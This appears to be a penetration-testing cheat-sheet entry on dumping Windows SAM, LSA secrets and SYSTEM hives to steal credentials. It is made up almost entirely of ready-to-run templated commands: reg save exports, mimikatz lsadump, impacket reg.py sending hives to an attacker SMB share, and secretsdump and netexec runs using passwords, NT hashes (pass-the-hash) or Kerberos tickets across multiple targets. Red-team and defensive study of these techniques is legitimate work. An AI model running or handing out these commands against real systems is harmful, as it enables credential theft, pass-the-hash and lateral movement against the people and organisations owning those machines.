---
technique: SamLsaDump
category: credential-dumping
protocols: SMB, RPC
remote_capable: true
tags: sam lsa secrets credential-dumping registry hive nt-hash ad windows
---

# SamLsaDump

The SAM hive stores local account NT hashes; the SECURITY hive stores LSA secrets including domain cached credentials (DCC2), service account plaintext passwords, and Kerberos keys. Both are encrypted with keys derivable from the SYSTEM hive. Dumping them requires local admin rights and grants material usable for pass-the-hash, cracking, or pass-the-ticket depending on the credential type recovered.

## Credential Types

| Source | Material | Subsequent attacks |
|--------|----------|--------------------|
| SAM | Local LM/NT hashes | Pass-the-hash, cracking |
| SECURITY (LSA) | Plaintext passwords, NT hashes, Kerberos keys, DCC1/DCC2 | PtH, overpass-the-hash, cracking |
| SYSTEM | Decryption keys | Required alongside SAM/SECURITY |

## Windows

### Step 1: Export SAM hive (reg save)

#cmd #native #registry-export

Export the SAM hive to disk from a running system using the built-in `reg` tool.

```cmd title:"Export SAM hive with reg save"
reg save HKLM\SAM C:\Windows\Temp\sam.save
```
<!-- cheat -->

### Step 2: Export SECURITY hive (reg save)

#cmd #native #registry-export

Export the SECURITY hive to disk from a running system using the built-in `reg` tool.

```cmd title:"Export SECURITY hive with reg save"
reg save HKLM\SECURITY C:\Windows\Temp\security.save
```
<!-- cheat -->

### Step 3: Export SYSTEM hive (reg save)

#cmd #native #registry-export

Export the SYSTEM hive to disk from a running system using the built-in `reg` tool.

```cmd title:"Export SYSTEM hive with reg save"
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
```
<!-- cheat -->

### mimikatz lsadump::sam (live)

#cmd #mimikatz #sam

Dump SAM hashes directly from live memory with mimikatz.

```cmd title:"Dump SAM hashes live with mimikatz lsadump::sam"
lsadump::sam
```
<!-- cheat -->

### mimikatz lsadump::sam (offline)

#cmd #mimikatz #sam

Parse previously exported SAM and SYSTEM hive files offline with mimikatz.

```cmd title:"Parse exported SAM hive offline with mimikatz"
lsadump::sam /sam:"C:\path\to\sam.save" /system:"C:\path\to\system.save"
```
<!-- cheat -->

### mimikatz lsadump::secrets (live)

#cmd #mimikatz #lsa

Dump LSA secrets directly from live memory with mimikatz.

```cmd title:"Dump LSA secrets live with mimikatz lsadump::secrets"
lsadump::secrets
```
<!-- cheat -->

### mimikatz lsadump::secrets (offline)

#cmd #mimikatz #lsa

Parse previously exported SECURITY and SYSTEM hive files offline with mimikatz.

```cmd title:"Parse exported SECURITY hive offline with mimikatz"
lsadump::secrets /security:"C:\path\to\security.save" /system:"C:\path\to\system.save"
```
<!-- cheat -->

## Linux

### Step 1: Start SMB share (reg.py remote export)

#impacket #smb #registry-export #remote

Start a local SMB share to receive remotely exported registry hives.

```sh title:"Start SMB share to receive registry hive exports"
smbserver.py -smb2support share ./
```
<!-- cheat
import tun_ip
-->

### Step 2: Export SAM hive (reg.py)

#impacket #smb #registry-export #remote

Remotely save the SAM registry hive from a target to the attacker SMB share using impacket's reg.py.

```sh title:"Remote SAM hive export via impacket reg.py"
reg.py "$domain/$user:$pass@$rhost_ip" save -keyName 'HKLM\SAM' -o "\\\\$lhost\\share"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost_ip
-->

### Step 3: Export SYSTEM hive (reg.py)

#impacket #smb #registry-export #remote

Remotely save the SYSTEM registry hive from a target to the attacker SMB share using impacket's reg.py.

```sh title:"Remote SYSTEM hive export via impacket reg.py"
reg.py "$domain/$user:$pass@$rhost_ip" save -keyName 'HKLM\SYSTEM' -o "\\\\$lhost\\share"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost_ip
-->

### Step 4: Export SECURITY hive (reg.py)

#impacket #smb #registry-export #remote

Remotely save the SECURITY registry hive from a target to the attacker SMB share using impacket's reg.py.

```sh title:"Remote SECURITY hive export via impacket reg.py"
reg.py "$domain/$user:$pass@$rhost_ip" save -keyName 'HKLM\SECURITY' -o "\\\\$lhost\\share"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var rhost_ip
-->

### secretsdump (remote, password auth)

#impacket #smb #sam #lsa #remote

Remotely dump SAM and LSA secrets from a live target using a plaintext password.

```sh title:"Remote SAM/LSA dump via secretsdump with password"
secretsdump.py "$domain/$user:$pass@$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
var rhost_ip
-->

### secretsdump (remote, NT hash auth)

#impacket #smb #pth #sam #lsa #remote

Remotely dump SAM and LSA secrets from a live target using an NT hash.

```sh title:"Remote SAM/LSA dump via secretsdump with NT hash"
secretsdump.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var rhost_ip
-->

### secretsdump (remote, Kerberos auth)

#impacket #smb #kerberos #sam #lsa #remote

Remotely dump SAM and LSA secrets from a live target using a Kerberos ticket.

```sh title:"Remote SAM/LSA dump via secretsdump with Kerberos ticket"
secretsdump.py -k "$domain/$user@$rhost_ip"
```
<!-- cheat
import domain_ip
import users
var rhost_ip
-->

### secretsdump (offline SAM)

#impacket #offline #sam #lsa

Parse previously exfiltrated SAM hive offline to extract local NT hashes.

```sh title:"Offline SAM parse via secretsdump"
secretsdump.py -sam sam.save -system system.save LOCAL
```
<!-- cheat -->

### secretsdump (offline SECURITY)

#impacket #offline #sam #lsa

Parse previously exfiltrated SECURITY hive offline to extract LSA secrets.

```sh title:"Offline SECURITY hive parse via secretsdump"
secretsdump.py -security security.save -system system.save LOCAL
```
<!-- cheat -->

### secretsdump (offline SAM + SECURITY)

#impacket #offline #sam #lsa

Parse previously exfiltrated SAM and SECURITY hives together offline to extract all local credential material.

```sh title:"Offline SAM and SECURITY combined parse via secretsdump"
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
<!-- cheat -->

### netexec (SAM)

#smb #sam #multi-auth #multi-target

Dump SAM hashes from multiple targets using netexec with reusable password, hash, or Kerberos auth.

```sh title:"Remote SAM dump across targets via netexec"
nxc smb "$rhost_ip" -d "$domain" -u "$user" $auth_flags --sam
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var rhost_ip
-->

### netexec (LSA)

#smb #lsa #multi-auth #multi-target

Dump LSA secrets from multiple targets using netexec with reusable password, hash, or Kerberos auth.

```sh title:"Remote LSA dump across targets via netexec"
nxc smb "$rhost_ip" -d "$domain" -u "$user" $auth_flags --lsa
```
<!-- cheat
import domain_ip
import users
import nxc_auth
var rhost_ip
-->

### netexec (SAM, local auth with NT hash)

#smb #pth #sam #local-auth #multi-target

Dump SAM hashes from multiple targets using netexec with local account authentication and an NT hash.

```sh title:"Remote SAM dump via netexec with local auth and NT hash"
nxc smb "$rhost_ip" --local-auth -u "$user" -H "$nt_hash" --sam
```
<!-- cheat
import users
var nt_hash
var rhost_ip
-->
